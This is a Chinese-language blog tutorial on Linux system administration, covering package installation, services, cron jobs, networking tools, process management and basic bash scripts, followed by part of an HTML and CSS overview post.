check-update：检查有哪些可以更新的软件包。 yum info：显示软件包的相关信息，例如yum info nginx。 rpm - Redhat Package Manager。 安装软件包：rpm -ivh &lt;packagename&gt;.rpm。 移除软件包：rpm -e &lt;packagename&gt;。 查询软件包：rpm -qa，例如可以用rpm -qa | grep mysql来检查是否安装了MySQL相关的软件包。 下面以Nginx为例，演示如何使用yum安装软件。 [root ~]# yum -y install nginx ... Installed: nginx.x86_64 1:1.12.2-2.el7 Dependency Installed: nginx-all-modules.noarch 1:1.12.2-2.el7 nginx-mod-http-geoip.x86_64 1:1.12.2-2.el7 nginx-mod-http-image-filter.x86_64 1:1.12.2-2.el7 nginx-mod-http-perl.x86_64 1:1.12.2-2.el7 nginx-mod-http-xslt-filter.x86_64 1:1.12.2-2.el7 nginx-mod-mail.x86_64 1:1.12.2-2.el7 nginx-mod-stream.x86_64 1:1.12.2-2.el7 Complete! [root ~]# yum info nginx Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile Installed Packages Name : nginx Arch : x86_64 Epoch : 1 Version : 1.12.2 Release : 2.el7 Size : 1.5 M Repo : installed From repo : epel Summary : A high performance web server and reverse proxy server URL : http://nginx.org/ License : BSD Description : Nginx is a web server and a reverse proxy server for HTTP, SMTP, POP3 and : IMAP protocols, with a strong focus on high concurrency, performance and low : memory usage. [root ~]# nginx -v nginx version: nginx/1.12.2 移除Nginx。 [root ~]# yum -y remove nginx 下面以MySQL为例，演示如何使用rpm安装软件。要安装MySQL需要先到MySQL官方网站下载对应的RPM文件，当然要选择和你使用的Linux系统对应的版本。MySQL现在是Oracle公司旗下的产品，在MySQL被收购后，MySQL的作者重新制作了一个MySQL的分支MariaDB，可以通过yum进行安装。 [root mysql]# ls mysql-community-client-5.7.22-1.el7.x86_64.rpm mysql-community-common-5.7.22-1.el7.x86_64.rpm mysql-community-libs-5.7.22-1.el7.x86_64.rpm mysql-community-server-5.7.22-1.el7.x86_64.rpm [root mysql]# yum -y remove mariadb-libs [root mysql]# yum -y install libaio [root mysql]#rpm -ivh mysql-community-common-5.7.26-1.el7.x86_64.rpm ... [root mysql]#rpm -ivh mysql-community-libs-5.7.26-1.el7.x86_64.rpm ... [root mysql]#rpm -ivh mysql-community-client-5.7.26-1.el7.x86_64.rpm ... [root mysql]#rpm -ivh mysql-community-server-5.7.26-1.el7.x86_64.rpm ... 说明：由于MySQL和MariaDB的底层依赖库是有冲突的，所以上面我们首先用yum移除了名为mariadb-libs的依赖库并安装了名为libaio支持异步I/O操作的依赖库。关于MySQL和MariaDB之间的关系，可以阅读维基百科上关于MariaDB的介绍。 移除安装的MySQL。 [root ~]# rpm -qa | grep mysql | xargs rpm -e 下载解压配置环境变量下面以安装MongoDB为例，演示这类软件应该如何安装。 [root ~]# wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-3.6.5.tgz --2018-06-21 18:32:53-- https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-rhel70-3.6.5.tgz Resolving fastdl.mongodb.org (fastdl.mongodb.org)... 52.85.83.16, 52.85.83.228, 52.85.83.186, ... Connecting to fastdl.mongodb.org (fastdl.mongodb.org)|52.85.83.16|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 100564462 (96M) [application/x-gzip] Saving to: ‘mongodb-linux-x86_64-rhel70-3.6.5.tgz’ 100%[==================================================&gt;] 100,564,462 630KB/s in 2m 9s 2018-06-21 18:35:04 (760 KB/s) - ‘mongodb-linux-x86_64-rhel70-3.6.5.tgz’ saved [100564462/100564462] [root ~]# gunzip mongodb-linux-x86_64-rhel70-3.6.5.tgz [root ~]# tar -xvf mongodb-linux-x86_64-rhel70-3.6.5.tar mongodb-linux-x86_64-rhel70-3.6.5/README mongodb-linux-x86_64-rhel70-3.6.5/THIRD-PARTY-NOTICES mongodb-linux-x86_64-rhel70-3.6.5/MPL-2 mongodb-linux-x86_64-rhel70-3.6.5/GNU-AGPL-3.0 mongodb-linux-x86_64-rhel70-3.6.5/bin/mongodump mongodb-linux-x86_64-rhel70-3.6.5/bin/mongorestore mongodb-linux-x86_64-rhel70-3.6.5/bin/mongoexport mongodb-linux-x86_64-rhel70-3.6.5/bin/mongoimport mongodb-linux-x86_64-rhel70-3.6.5/bin/mongostat mongodb-linux-x86_64-rhel70-3.6.5/bin/mongotop mongodb-linux-x86_64-rhel70-3.6.5/bin/bsondump mongodb-linux-x86_64-rhel70-3.6.5/bin/mongofiles mongodb-linux-x86_64-rhel70-3.6.5/bin/mongoreplay mongodb-linux-x86_64-rhel70-3.6.5/bin/mongoperf mongodb-linux-x86_64-rhel70-3.6.5/bin/mongod mongodb-linux-x86_64-rhel70-3.6.5/bin/mongos mongodb-linux-x86_64-rhel70-3.6.5/bin/mongo mongodb-linux-x86_64-rhel70-3.6.5/bin/install_compass [root ~]# vim .bash_profile ... PATH=$PATH:$HOME/bin:$HOME/mongodb-linux-x86_64-rhel70-3.6.5/bin export PATH ... [root ~]# source .bash_profile [root ~]# mongod --version db version v3.6.5 git version: a20ecd3e3a174162052ff99913bc2ca9a839d618 OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013 allocator: tcmalloc modules: none build environment: distmod: rhel70 distarch: x86_64 target_arch: x86_64 [root ~]# mongo --version MongoDB shell version v3.6.5 git version: a20ecd3e3a174162052ff99913bc2ca9a839d618 OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013 allocator: tcmalloc modules: none build environment: distmod: rhel70 distarch: x86_64 target_arch: x86_64 说明：当然也可以通过yum来安装MongoDB，具体可以参照官方网站上给出的说明。 源代码构建安装 安装Python 3.6。 [root ~]# yum install gcc [root ~]# wget https://www.python.org/ftp/python/3.6.5/Python-3.6.5.tgz [root ~]# gunzip Python-3.6.5.tgz [root ~]# tar -xvf Python-3.6.5.tar [root ~]# cd Python-3.6.5 [root ~]# ./configure --prefix=/usr/local/python36 --enable-optimizations [root ~]# yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel [root ~]# make &amp;&amp; make install ... [root ~]# ln -s /usr/local/python36/bin/python3.6 /usr/bin/python3 [root ~]# python3 --version Python 3.6.5 [root ~]# python3 -m pip install -U pip [root ~]# pip3 --version 说明：上面在安装好Python之后还需要注册PATH环境变量，将Python安装路径下bin文件夹的绝对路径注册到PATH环境变量中。注册环境变量可以修改用户主目录下的.bash_profile或者/etc目录下的profile文件，二者的区别在于前者相当于是用户环境变量，而后者相当于是系统环境变量。 安装Redis-3.2.12。 [root ~]# wget http://download.redis.io/releases/redis-3.2.12.tar.gz [root ~]# gunzip redis-3.2.12.tar.gz [root ~]# tar -xvf redis-3.2.12.tar [root ~]# cd redis-3.2.12 [root ~]# make &amp;&amp; make install [root ~]# redis-server --version Redis server v=3.2.12 sha=00000000:0 malloc=jemalloc-4.0.3 bits=64 build=5bc5cd3c03d6ceb6 [root ~]# redis-cli --version redis-cli 3.2.12 配置服务我们可以Linux系统下安装和配置各种服务，也就是说我们可以把Linux系统打造成数据库服务器、Web服务器、缓存服务器、文件服务器、消息队列服务器等等。Linux下的大多数服务都被设置为守护进程（驻留在系统后台运行，但不会因为服务还在运行而导致Linux无法停止运行），所以我们安装的服务通常名字后面都有一个字母d，它是英文单词daemon的缩写，例如：防火墙服务叫firewalld，我们之前安装的MySQL服务叫mysqld，Apache服务器叫httpd等。在安装好服务之后，可以使用systemctl命令或service命令来完成对服务的启动、停止等操作，具体操作如下所示。 启动防火墙服务。 [root ~]# systemctl start firewalld 终止防火墙服务。 [root ~]# systemctl stop firewalld 重启防火墙服务。 [root ~]# systemctl restart firewalld 查看防火墙服务状态。 [root ~]# systemctl status firewalld 设置/禁用防火墙服务开机自启。 [root ~]# systemctl enable firewalld Created symlink from /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service to /usr/lib/systemd/system/firewalld.service. Created symlink from /etc/systemd/system/multi-user.target.wants/firewalld.service to /usr/lib/systemd/system/firewalld.service. [root ~]# systemctl disable firewalld Removed symlink /etc/systemd/system/multi-user.target.wants/firewalld.service. Removed symlink /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service. 计划任务 在指定的时间执行命令。 at - 将任务排队，在指定的时间执行。 atq - 查看待执行的任务队列。 atrm - 从队列中删除待执行的任务。 指定3天以后下午5点要执行的任务。 [root ~]# at 5pm+3days at&gt; rm -f /root/*.html at&gt; &lt;EOT&gt; job 9 at Wed Jun 5 17:00:00 2019 查看待执行的任务队列。 [root ~]# atq 9 Wed Jun 5 17:00:00 2019 a root 从队列中删除指定的任务。 [root ~]$ atrm 9 计划任务表 - crontab。 [root ~]# crontab -e * * * * * echo \"hello, world!\" &gt;&gt; /root/hello.txt 59 23 * * * rm -f /root/*.log 说明：输入crontab -e命令会打开vim来编辑Cron表达式并指定触发的任务，上面我们定制了两个计划任务，一个是每分钟向/root目录下的hello.txt中追加输出hello, world!；另一个是每天23时59分执行删除/root目录下以log为后缀名的文件。如果不知道Cron表达式如何书写，可以参照/etc/crontab文件中的提示（下面会讲到）或者用搜索引擎找一下“Cron表达式在线生成器”来生成Cron表达式。 和crontab相关的文件在/etc目录下，通过修改/etc目录下的crontab文件也能够定制计划任务。 [root ~]# cd /etc [root etc]# ls -l | grep cron -rw-------. 1 root root 541 Aug 3 2017 anacrontab drwxr-xr-x. 2 root root 4096 Mar 27 11:56 cron.d drwxr-xr-x. 2 root root 4096 Mar 27 11:51 cron.daily -rw-------. 1 root root 0 Aug 3 2017 cron.deny drwxr-xr-x. 2 root root 4096 Mar 27 11:50 cron.hourly drwxr-xr-x. 2 root root 4096 Jun 10 2014 cron.monthly -rw-r--r-- 1 root root 493 Jun 23 15:09 crontab drwxr-xr-x. 2 root root 4096 Jun 10 2014 cron.weekly [root etc]# vim crontab 1 SHELL=/bin/bash 2 PATH=/sbin:/bin:/usr/sbin:/usr/bin 3 MAILTO=root 4 5 # For details see man 4 crontabs 6 7 # Example of job definition: 8 # .---------------- minute (0 - 59) 9 # | .------------- hour (0 - 23) 10 # | | .---------- day of month (1 - 31) 11 # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... 12 # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat 13 # | | | | | 14 # * * * * * user-name command to be executed 网络访问和管理 安全远程连接 - ssh。 [root ~]$ ssh root@120.77.222.217 The authenticity of host '120.77.222.217 (120.77.222.217)' can't be established. ECDSA key fingerprint is SHA256:BhUhykv+FvnIL03I9cLRpWpaCxI91m9n7zBWrcXRa8w. ECDSA key fingerprint is MD5:cc:85:e9:f0:d7:07:1a:26:41:92:77:6b:7f:a0:92:65. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '120.77.222.217' (ECDSA) to the list of known hosts. root@120.77.222.217's password: 通过网络获取资源 - wget。 -b 后台下载模式 -O 下载到指定的目录 -r 递归下载 发送和接收邮件 - mail。 网络配置工具（旧） - ifconfig。 [root ~]# ifconfig eth0 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.18.61.250 netmask 255.255.240.0 broadcast 172.18.63.255 ether 00:16:3e:02:b6:46 txqueuelen 1000 (Ethernet) RX packets 1067841 bytes 1296732947 (1.2 GiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 409912 bytes 43569163 (41.5 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 网络配置工具（新） - ip。 [root ~]# ip address 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 00:16:3e:02:b6:46 brd ff:ff:ff:ff:ff:ff inet 172.18.61.250/20 brd 172.18.63.255 scope global eth0 valid_lft forever preferred_lft forever 网络可达性检查 - ping。 [root ~]# ping www.baidu.com -c 3 PING www.a.shifen.com (220.181.111.188) 56(84) bytes of data. 64 bytes from 220.181.111.188 (220.181.111.188): icmp_seq=1 ttl=51 time=36.3 ms 64 bytes from 220.181.111.188 (220.181.111.188): icmp_seq=2 ttl=51 time=36.4 ms 64 bytes from 220.181.111.188 (220.181.111.188): icmp_seq=3 ttl=51 time=36.4 ms --- www.a.shifen.com ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2002ms rtt min/avg/max/mdev = 36.392/36.406/36.427/0.156 ms 显示或管理路由表 - route。 查看网络服务和端口 - netstat / ss。 [root ~]# netstat -nap | grep nginx 网络监听抓包 - tcpdump。 安全文件拷贝 - scp。 [root ~]# scp root@1.2.3.4:/root/guido.jpg hellokitty@4.3.2.1:/home/hellokitty/pic.jpg 文件同步工具 - rsync。 说明：使用rsync可以实现文件的自动同步，这个对于文件服务器来说相当重要。关于这个命令的用法，我们在后面讲项目部署的时候为大家详细说明。 安全文件传输 - sftp。 [root ~]# sftp root@1.2.3.4 root@1.2.3.4's password: Connected to 1.2.3.4. sftp&gt; help：显示帮助信息。 ls/lls：显示远端/本地目录列表。 cd/lcd：切换远端/本地路径。 mkdir/lmkdir：创建远端/本地目录。 pwd/lpwd：显示远端/本地当前工作目录。 get：下载文件。 put：上传文件。 rm：删除远端文件。 bye/exit/quit：退出sftp。 进程管理 查看进程 - ps。 [root ~]# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 Jun23 ? 00:00:05 /usr/lib/systemd/systemd --switched-root --system --deserialize 21 root 2 0 0 Jun23 ? 00:00:00 [kthreadd] ... [root ~]# ps -ef | grep mysqld root 4943 4581 0 22:45 pts/0 00:00:00 grep --color=auto mysqld mysql 25257 1 0 Jun25 ? 00:00:39 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid 显示进程状态树 - pstree。 [root ~]# pstree systemd─┬─AliYunDun───18*[{AliYunDun}] ├─AliYunDunUpdate───3*[{AliYunDunUpdate}] ├─2*[agetty] ├─aliyun-service───2*[{aliyun-service}] ├─atd ├─auditd───{auditd} ├─dbus-daemon ├─dhclient ├─irqbalance ├─lvmetad ├─mysqld───28*[{mysqld}] ├─nginx───2*[nginx] ├─ntpd ├─polkitd───6*[{polkitd}] ├─rsyslogd───2*[{rsyslogd}] ├─sshd───sshd───bash───pstree ├─systemd-journal ├─systemd-logind ├─systemd-udevd └─tuned───4*[{tuned}] 查找与指定条件匹配的进程 - pgrep。 [root ~]$ pgrep mysqld 3584 通过进程号终止进程 - kill。 [root ~]$ kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP 21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8 43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2 63) SIGRTMAX-1 64) SIGRTMAX [root ~]# kill 1234 [root ~]# kill -9 1234 例子：用一条命令强制终止正在运行的Redis进程。 ps -ef | grep redis | grep -v grep | awk '{print $2}' | xargs kill 通过进程名终止进程 - killall / pkill。 结束名为mysqld的进程。 [root ~]# pkill mysqld 结束hellokitty用户的所有进程。 [root ~]# pkill -u hellokitty 说明：这样的操作会让hellokitty用户和服务器断开连接。 将进程置于后台运行。 Ctrl+Z - 快捷键，用于停止进程并置于后台。 &amp; - 将进程置于后台运行。 [root ~]# mongod &amp; [root ~]# redis-server ... ^Z [4]+ Stopped redis-server 查询后台进程 - jobs。 [root ~]# jobs [2] Running mongod &amp; [3]- Stopped cat [4]+ Stopped redis-server 让进程在后台继续运行 - bg。 [root ~]# bg %4 [4]+ redis-server &amp; [root ~]# jobs [2] Running mongod &amp; [3]+ Stopped cat [4]- Running redis-server &amp; 将后台进程置于前台 - fg。 [root ~]# fg %4 redis-server 说明：置于前台的进程可以使用Ctrl+C来终止它。 调整程序/进程运行时优先级 - nice / renice。 用户登出后进程继续工作 - nohup。 [root ~]# nohup ping www.baidu.com &gt; result.txt &amp; 跟踪进程系统调用情况 - strace。 [root ~]# pgrep mysqld 8803 [root ~]# strace -c -p 8803 strace: Process 8803 attached ^Cstrace: Process 8803 detached % time seconds usecs/call calls errors syscall ------ ----------- ----------- --------- --------- ---------------- 99.18 0.005719 5719 1 restart_syscall 0.49 0.000028 28 1 mprotect 0.24 0.000014 14 1 clone 0.05 0.000003 3 1 mmap 0.03 0.000002 2 1 accept ------ ----------- ----------- --------- --------- ---------------- 100.00 0.005766 5 total 说明：这个命令的用法和参数都比较复杂，建议大家在真正用到这个命令的时候再根据实际需要进行了解。 查看当前运行级别 - runlevel。 [root ~]# runlevel N 3 实时监控进程占用资源状况 - top。 [root ~]# top top - 23:04:23 up 3 days, 14:10, 1 user, load average: 0.00, 0.01, 0.05 Tasks: 65 total, 1 running, 64 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.3 us, 0.3 sy, 0.0 ni, 99.3 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 1016168 total, 191060 free, 324700 used, 500408 buff/cache KiB Swap: 0 total, 0 free, 0 used. 530944 avail Mem ... -c - 显示进程的整个路径。 -d - 指定两次刷屏之间的间隔时间（秒为单位）。 -i - 不显示闲置进程或僵尸进程。 -p - 显示指定进程的信息。 系统诊断 系统启动异常诊断 - dmesg。 查看系统活动信息 - sar。 [root ~]# sar -u -r 5 10 Linux 3.10.0-957.10.1.el7.x86_64 (izwz97tbgo9lkabnat2lo8z) 06/02/2019 _x86_64_ (2 CPU) 06:48:30 PM CPU %user %nice %system %iowait %steal %idle 06:48:35 PM all 0.10 0.00 0.10 0.00 0.00 99.80 06:48:30 PM kbmemfree kbmemused %memused kbbuffers kbcached kbcommit %commit kbactive kbinact kbdirty 06:48:35 PM 1772012 2108392 54.33 102816 1634528 784940 20.23 793328 1164704 0 -A - 显示所有设备（CPU、内存、磁盘）的运行状况。 -u - 显示所有CPU的负载情况。 -d - 显示所有磁盘的使用情况。 -r - 显示内存的使用情况。 -n - 显示网络运行状态。 查看内存使用情况 - free。 [root ~]# free total used free shared buff/cache available Mem: 1016168 323924 190452 356 501792 531800 Swap: 0 0 0 虚拟内存统计 - vmstat。 [root ~]# vmstat procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 2 0 0 204020 79036 667532 0 0 5 18 101 58 1 0 99 0 0 CPU信息统计 - mpstat。 [root ~]# mpstat Linux 3.10.0-957.5.1.el7.x86_64 (iZ8vba0s66jjlfmo601w4xZ) 05/30/2019 _x86_64_ (1 CPU) 01:51:54 AM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle 01:51:54 AM all 0.71 0.00 0.17 0.04 0.00 0.00 0.00 0.00 0.00 99.07 查看进程使用内存状况 - pmap。 [root ~]# ps PID TTY TIME CMD 4581 pts/0 00:00:00 bash 5664 pts/0 00:00:00 ps [root ~]# pmap 4581 4581: -bash 0000000000400000 884K r-x-- bash 00000000006dc000 4K r---- bash 00000000006dd000 36K rw--- bash 00000000006e6000 24K rw--- [ anon ] 0000000001de0000 400K rw--- [ anon ] 00007f82fe805000 48K r-x-- libnss_files-2.17.so 00007f82fe811000 2044K ----- libnss_files-2.17.so ... 报告设备CPU和I/O统计信息 - iostat。 [root ~]# iostat Linux 3.10.0-693.11.1.el7.x86_64 (iZwz97tbgo9lkabnat2lo8Z) 06/26/2018 _x86_64_ (1 CPU) avg-cpu: %user %nice %system %iowait %steal %idle 0.79 0.00 0.20 0.04 0.00 98.97 Device: tps kB_read/s kB_wrtn/s kB_read kB_wrtn vda 0.85 6.78 21.32 2106565 6623024 vdb 0.00 0.01 0.00 2088 0 显示所有PCI设备 - lspci。 [root ~]# lspci 00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02) 00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II] 00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II] 00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01) 00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03) 00:02.0 VGA compatible controller: Cirrus Logic GD 5446 00:03.0 Ethernet controller: Red Hat, Inc. Virtio network device 00:04.0 Communication controller: Red Hat, Inc. Virtio console 00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device 00:06.0 SCSI storage controller: Red Hat, Inc. Virtio block device 00:07.0 Unclassified device [00ff]: Red Hat, Inc. Virtio memory balloon 显示进程间通信设施的状态 - ipcs。 [root ~]# ipcs ------ Message Queues -------- key msqid owner perms used-bytes messages ------ Shared Memory Segments -------- key shmid owner perms bytes nattch status ------ Semaphore Arrays -------- key semid owner perms nsems Shell编程之前我们提到过，Shell是一个连接用户和操作系统的应用程序，它提供了人机交互的界面（接口），用户通过这个界面访问操作系统内核的服务。Shell脚本是一种为Shell编写的脚本程序，我们可以通过Shell脚本来进行系统管理，同时也可以通过它进行文件操作。总之，编写Shell脚本对于使用Linux系统的人来说，应该是一项标配技能。 互联网上有大量关于Shell脚本的相关知识，我不打算再此对Shell脚本做一个全面系统的讲解，我们通过下面的代码来感性的认识下Shell脚本就行了。 例子1：输入两个整数m和n，计算从m到n的整数求和的结果。 #!/usr/bin/bash printf 'm = ' read m printf 'n = ' read n a=$m sum=0 while [ $a -le $n ] do sum=$[ sum + a ] a=$[ a + 1 ] done echo '结果: '$sum 例子2：自动创建文件夹和指定数量的文件。 #!/usr/bin/bash printf '输入文件夹名: ' read dir printf '输入文件名: ' read file printf '输入文件数量(&lt;1000): ' read num if [ $num -ge 1000 ] then echo '文件数量不能超过1000' else if [ -e $dir -a -d $dir ] then rm -rf $dir else if [ -e $dir -a -f $dir ] then rm -f $dir fi fi mkdir -p $dir index=1 while [ $index -le $num ] do if [ $index -lt 10 ] then pre='00' elif [ $index -lt 100 ] then pre='0' else pre='' fi touch $dir'/'$file'_'$pre$index index=$[ index + 1 ] done fi 例子3：自动安装指定版本的Redis。 #!/usr/bin/bash install_redis() { if ! which redis-server &gt; /dev/null then cd /root wget $1$2'.tar.gz' &gt;&gt; install.log gunzip /root/$2'.tar.gz' tar -xf /root/$2'.tar' cd /root/$2 make &gt;&gt; install.log make install &gt;&gt; install.log echo '安装完成' else echo '已经安装过Redis' fi } install_redis 'http://download.redis.io/releases/' $1 相关资源 Linux命令行常用快捷键 快捷键 功能说明 tab 自动补全命令或路径 Ctrl+a 将光标移动到命令行行首 Ctrl+e 将光标移动到命令行行尾 Ctrl+f 将光标向右移动一个字符 Ctrl+b 将光标向左移动一个字符 Ctrl+k 剪切从光标到行尾的字符 Ctrl+u 剪切从光标到行首的字符 Ctrl+w 剪切光标前面的一个单词 Ctrl+y 复制剪切命名剪切的内容 Ctrl+c 中断正在执行的任务 Ctrl+h 删除光标前面的一个字符 Ctrl+d 退出当前命令行 Ctrl+r 搜索历史命令 Ctrl+g 退出历史命令搜索 Ctrl+l 清除屏幕上所有内容在屏幕的最上方开启一个新行 Ctrl+s 锁定终端使之暂时无法输入内容 Ctrl+q 退出终端锁定 Ctrl+z 将正在终端执行的任务停下来放到后台 !! 执行上一条命令 !数字 执行数字对应的历史命令 !字母 执行最近的以字母打头的命令 !$ / Esc+. 获得上一条命令最后一个参数 Esc+b 移动到当前单词的开头 Esc+f 移动到当前单词的结尾 man查阅命令手册的内容说明 手册中的标题 功能说明 NAME 命令的说明和介绍 SYNOPSIS 使用该命令的基本语法 DESCRIPTION 使用该命令的详细描述，各个参数的作用，有时候这些信息会出现在OPTIONS中 OPTIONS 命令相关参数选项的说明 EXAMPLES 使用该命令的参考例子 EXIT STATUS 命令结束的退出状态码，通常0表示成功执行 SEE ALSO 和命令相关的其他命令或信息 BUGS 和命令相关的缺陷的描述 AUTHOR 该命令的作者介绍","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.xiaocaibi.top/tags/Linux/"}]},{"title":"21-30.wev前端概述","slug":"21-30-wev前端概述","date":"2021-05-20T15:41:21.000Z","updated":"2021-09-20T08:47:43.900Z","comments":true,"path":"posts/4f1578e7.html","link":"","permalink":"http://www.xiaocaibi.top/posts/4f1578e7.html","excerpt":"","text":"Web前端概述 说明：本文使用的部分插图来自Jon Duckett先生的*HTML and CSS: Design and Build Websites*一书，这是一本非常棒的前端入门书，有兴趣的读者可以在亚马逊或者其他网站上找到该书的购买链接。 HTML简史 1991年10月：一个非正式CERN（欧洲核子研究中心）文件首次公开18个HTML标签，这个文件的作者是物理学家蒂姆·伯纳斯-李，因此他是万维网的发明者，也是万维网联盟的主席。 1995年11月：HTML 2.0标准发布（RFC 1866）。 1997年1月：HTML 3.2作为W3C推荐标准发布。 1997年12月：HTML 4.0作为W3C推荐标准发布。 1999年12月：HTML4.01作为W3C推荐标准发布。 2008年1月：HTML5由W3C作为工作草案发布。 2011年5月：W3C将HTML5推进至“最终征求”（Last Call）阶段。 2012年12月：W3C指定HTML5作为“候选推荐”阶段。 2014年10月：HTML5作为稳定W3C推荐标准发布，这意味着HTML5的标准化已经完成。 HTML5新特性 引入原生多媒体支持（audio和video标签） 引入可编程内容（canvas标签） 引入语义Web（article、aside、details、figure、footer、header、nav、section、summary等标签） 引入新的表单控件（日历、邮箱、搜索、滑条等） 引入对离线存储更好的支持（localStorage和sessionStorage） 引入对定位、拖放、WebSocket、后台任务等的支持 使用标签承载内容结构 html head title meta body 文本 标题（heading）和段落（paragraph） h1 ~ h6 p 上标（superscript）和下标（subscript） sup sub 空白（白色空间折叠） 折行（break）和水平标尺（horizontal ruler） br hr 语义化标签 加粗和强调 - strong 引用 - blockquote 缩写词和首字母缩写词 - abbr / acronym 引文 - cite 所有者联系信息 - address 内容的修改 - ins / del 列表（list） 有序列表（ordered list）- ol / li 无序列表（unordered list）- ul / li 定义列表（definition list）- dl / dt / dd 链接（anchor） 页面链接 锚链接 功能链接 图像（image） 图像存储位置 图像及其宽高 选择正确的图像格式 JPEG GIF PNG 矢量图 语义化标签 - figure / figcaption 表格（table） 基本的表格结构 - table / tr / td / th 表格的标题 - caption 跨行和跨列 - rowspan属性 / colspan属性 长表格 - thead / tbody / tfoot 表单（form） 重要属性 - action / method / enctype 表单控件（input）- type属性 文本框 - text / 密码框 - password / 数字框 - number 邮箱 - email / 电话 - tel / 日期 - date / 滑条 - range / URL - url / 搜索 - search 单选按钮 - radio / 复选按钮 - checkbox 文件上传 - file / 隐藏域 - hidden 提交按钮 - submit / 图像按钮 - image / 重置按钮 - reset 下拉列表 - select / option 文本域（多行文本）- textarea 组合表单元素 - fieldset / legend 音视频（audio / video） 视频格式和播放器 视频托管服务 添加视频的准备工作 video标签和属性 - autoplay / controls / loop / muted / preload / src audio标签和属性 - autoplay / controls / loop / muted / preload / src / width / height / poster 窗口（frame） 框架集（过时，不建议使用） - frameset / frame 内嵌窗口 - iframe 其他 文档类型 &lt;!doctype html&gt; &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt; &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt; 注释 &lt;!-- 这是一段注释，注释不能够嵌套 --&gt; 属性 id：唯一标识 class：元素所属的类，用于区分不同的元素 title：元素的额外信息（鼠标悬浮时会显示工具提示文本） tabindex：Tab键切换顺序 contenteditable：元素是否可编辑 draggable：元素是否可拖拽 块级元素 / 行级元素 字符实体（实体替换符） 使用CSS渲染页面简介 CSS的作用 CSS的工作原理 规则、属性和值 常用选择器 颜色（color） 如何指定颜色 颜色术语和颜色对比 背景色 文本（text / font） 文本的大小和字型(font-size / font-family) 粗细、样式、拉伸和装饰(font-weight / font-style / font-stretch / text-decoration) 行间距(line-height)、字母间距(letter-spacing)和单词间距(word-spacing) 对齐(text-align)方式和缩进(text-ident) 链接样式（:link / :visited / :active / :hover） CSS3新属性 阴影效果 - text-shadow 首字母和首行文本(:first-letter / :first-line) 响应用户 盒子（box model） 盒子大小的控制（width / height） 盒子的边框、外边距和内边距（border / margin / padding） 盒子的显示和隐藏（display / visibility） CSS3新属性 边框图像（border-image） 投影（border-shadow） 圆角（border-radius） 列表、表格和表单 列表的项目符号（list-style） 表格的边框和背景（border-collapse） 表单控件的外观 表单控件的对齐 浏览器的开发者工具 图像 控制图像的大小（display: inline-block） 对齐图像 背景图像（background / background-image / background-repeat / background-position） 布局 控制元素的位置（position / z-index） 普通流 相对定位 绝对定位 固定定位 